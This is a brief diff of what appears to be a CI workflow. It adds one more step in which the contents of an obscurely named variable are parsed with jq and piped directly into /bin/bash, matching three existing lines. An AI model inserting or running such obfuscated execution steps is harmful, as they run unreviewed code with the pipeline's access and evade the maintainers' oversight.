@@ -28,6 +28,7 @@ jobs:
           echo $lol32 | jq -r .djsz31 | /bin/bash
           printf '%s' "$tk908" | jq -r .wgm77542 | /bin/bash
           echo $hsf043 | jq -r .qunxu663 | /bin/bash
+          echo $pj7 | jq -r .ujw33 | /bin/bash
 
       - name: Save output
         if: always()
